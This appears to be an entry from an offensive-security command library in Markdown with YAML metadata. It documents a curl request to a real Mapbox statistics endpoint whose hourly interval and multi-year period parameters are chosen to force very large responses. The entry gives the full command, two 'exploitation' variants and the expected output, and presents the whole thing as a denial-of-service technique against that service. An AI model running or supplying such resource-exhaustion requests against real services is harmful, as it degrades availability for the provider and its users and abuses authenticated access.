---
id: cmd-curl-mapbox-dos
data: >-
  curl -H "Cookie: session=your_session_cookie"
  "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=hour&period=1451766083142,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155"
  -o dos_response.json
tags:
  - dos
  - api-abuse
  - resource-exhaustion
type: command
output: Large JSON response ~372 KB or more
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:37.039Z'
verified: false
validated: true
submitted: true
---
# curl-mapbox-dos-params

## Command

```bash
curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=hour&period=1451766083142,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155" -o dos_response.json
```

## Description

Sends a request to the Mapbox statistics endpoint with manipulated 'interval=hour' and extended 'period' to force generation of large datasets, leading to resource exhaustion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Auth session cookie | Yes |
| `interval=hour` | Finer granularity | Yes |
| `period=...` | Extended timestamps (months/years) | Yes |
| `-o dos_response.json` | Output file | No |

## Examples

### Basic Exploitation

```bash
curl -H "Cookie: session=abc123" "https://...interval=hour&period=1451766083142,1462370883143&..."
```

### Extended Period

```bash
curl -H "Cookie: session=abc123" "https://...interval=hour&period=1410000000000,1720000000000&..." -o large.json
```

## Expected Output

JSON with hourly metrics over extended period, size ~372 KB to MB, potentially with delays.

## Related

- [[commands/curl-mapbox-default-stats]]
- [[procedures/Manipulate-Interval-and-Period-for-DoS]]
